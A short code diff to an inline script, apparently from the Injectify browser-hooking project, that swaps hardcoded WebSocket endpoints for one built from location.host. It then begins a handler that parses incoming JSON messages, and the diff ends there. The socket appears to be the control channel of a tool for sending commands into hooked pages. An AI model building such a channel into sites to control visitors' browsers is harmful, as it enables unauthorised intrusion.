@@ -1,8 +1,6 @@
 <script>
 (function i() {
-    let url = 'ws://127.0.0.1:3000/i/websocket'
-    if (window.location.host === 'injectify.samdd.me') url = 'wss://injectify.samdd.me/i/websocket'
-    window.ws = new WebSocket(url + '?$' + btoa('private'))
+    window.ws = new WebSocket('ws://' + location.host + '/i/websocket?$' + btoa('private'))
     ws.onmessage = function(d) {
         try {
             d = JSON.parse(d.data)
